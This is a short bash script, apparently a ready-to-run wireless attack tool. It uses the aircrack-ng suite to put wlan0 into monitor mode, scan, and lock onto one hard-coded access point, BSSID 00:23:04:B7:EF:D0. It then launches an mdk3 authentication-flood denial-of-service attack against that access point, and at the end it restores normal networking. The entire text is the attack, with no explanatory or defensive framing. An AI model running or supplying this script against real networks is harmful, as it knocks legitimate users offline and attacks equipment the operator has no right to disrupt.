#!/bin/bash

airmon-ng check kill > /dev/null 2>&1
airmon-ng start wlan0 > /dev/null 2>&1
airodump-ng wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15 ; kill -9 $var
airodump-ng -c 1 --bssid 00:23:04:B7:EF:D0 wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 10 ; kill -9 $var
mdk3 wlan0mon a -a 00:23:04:B7:EF:D0
var=$! ; sleep 100 ; kill -9 $var
airmon-ng stop wlan0mon
systemctl enable NetworkManager
systemctl start NetworkManager

